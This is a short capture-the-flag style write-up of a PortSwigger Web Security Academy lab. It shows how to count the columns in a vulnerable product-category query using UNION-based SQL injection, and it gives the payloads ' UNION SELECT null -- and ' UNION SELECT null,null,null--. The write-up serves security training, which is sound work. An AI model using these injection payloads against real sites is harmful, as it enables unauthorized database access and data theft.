# Lab-7: [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack. 

**Aim :-** To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. 

## Solution 
- When select a category the query will look like the following
    ``` SELECT * FROM products WHERE category = '<category-name>' AND released = 1 ```

- To determine the number of columns use the following payload
    ``` ' UNION SELECT null -- ```
    - The query will return a **internal server error** which means that there is **one or more that one columns are present**

- Add more ``` null ``` to the query and make the request untill it gives a valid response

- Final payload
    ``` ' UNION SELECT null,null,null-- ```  
